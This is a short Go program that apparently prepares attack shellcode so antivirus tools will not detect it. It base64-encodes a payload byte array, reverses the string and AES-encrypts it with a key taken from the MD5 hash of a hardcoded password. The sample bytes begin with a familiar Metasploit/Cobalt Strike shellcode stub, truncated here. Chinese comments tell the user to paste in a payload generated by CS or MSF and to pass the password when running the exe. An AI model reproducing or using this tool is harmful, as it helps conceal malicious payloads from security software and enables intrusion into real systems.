package main
import (
	"encoding/base64"
	"fmt"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"crypto/md5"
)

const (
	password = "passwd"//此处密码需要在执行exe时作为参数使用
	//MYKEY = "76a2173be6393254"
	//IV    = "e72ffa4d6df1030a"
)


func stringReverse(str string) string{
  var bytes []byte = []byte(str)
  for i := 0; i < len(str)/2; i++ {
    tmp := bytes[len(str)-i-1]
    bytes[len(str)-i-1] = bytes[i]
    bytes[i] = tmp
  }
  str = string(bytes)
  return str;
}

func Aes_Encrypt(ss string,MYKEY string,IV string) string {
	src := []byte(ss)
	block, err := aes.NewCipher([]byte(MYKEY))
	if err != nil {
		panic(err)
	}
	src = paddingBytes(src, block.BlockSize())
	cbcDecrypter := cipher.NewCBCEncrypter(block, []byte(IV))
	dst := make([]byte, len(src))
	cbcDecrypter.CryptBlocks(dst, src)

	return hex.EncodeToString(dst)
}


func Aes_Decrypt(ss string,MYKEY string,IV string) string {
	src, _ := hex.DecodeString(ss)
	block, err := aes.NewCipher([]byte(MYKEY))
	if err != nil {
		panic(err)
	}
	cbcDecrypter := cipher.NewCBCDecrypter(block, []byte(IV))
	dst := make([]byte, len(src))
	cbcDecrypter.CryptBlocks(dst, src)
	newBytes := unPaddingBytes(dst)
	return string(newBytes)
}

func paddingBytes(src []byte, blockSize int) []byte {
	padding := blockSize - len(src)%blockSize
	padBytes := bytes.Repeat([]byte{byte(padding)}, padding)
	newBytes := append(src, padBytes...)
	return newBytes
}


func unPaddingBytes(src []byte) []byte {
	l := len(src)
	n := int(src[l-1])
	return src[:l-n]
}

func Md5(str string) string {
    h := md5.New()
    h.Write([]byte(str))
    return hex.EncodeToString(h.Sum(nil))
}

func main(){
	strMd5 := Md5(password)
	Mykey := strMd5[0:16]
	IV := strMd5[16:32]
	msg := []byte{ 
		0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x86,0xa0,
	}
	//替换msg为cs或msf生成的payload，注意将格式转化为msg中的格式
	encoded := base64.StdEncoding.EncodeToString(msg)
	revstr := stringReverse(encoded)
	aesstr := Aes_Encrypt(revstr,Mykey,IV)
	fmt.Println(aesstr)
}
